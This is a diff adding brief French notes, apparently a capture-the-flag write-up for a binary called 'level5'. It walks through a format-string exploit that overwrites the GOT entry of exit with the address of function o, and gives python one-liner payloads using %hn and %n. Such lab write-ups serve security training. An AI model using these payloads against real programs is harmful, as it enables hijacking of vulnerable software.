@@ -1,0 +1,18 @@
+le but est de changer l'appel a la fonction exit par la fonction o
+
+objdump -R level5
+-> on recupere l'offset de exit 0x08049838
+
+hn nous permert de changer 2 octets par 2 octets (au lieu de n 4 octets par 4 octets)
+
+adresse de o -> 080484a4 on va donc modifier 84a4 car c'est la eule parti changeante avec l'adresse de exit 0x08049838
+
+on veut remplacer 9838 par 84a4
+
+84a4 = 33956
+
+python -c "print '\x38\x98\x04\x08' + '%33952x' + '%4\$hn'" > /tmp/level5
+
+pour utiliser n et donc remplacer les 4 octets on peut faire
+080484a4 = 134513828
+python -c "print '\x38\x98\x04\x08' + '%134513824x' + '%4\$n'" > /tmp/level5
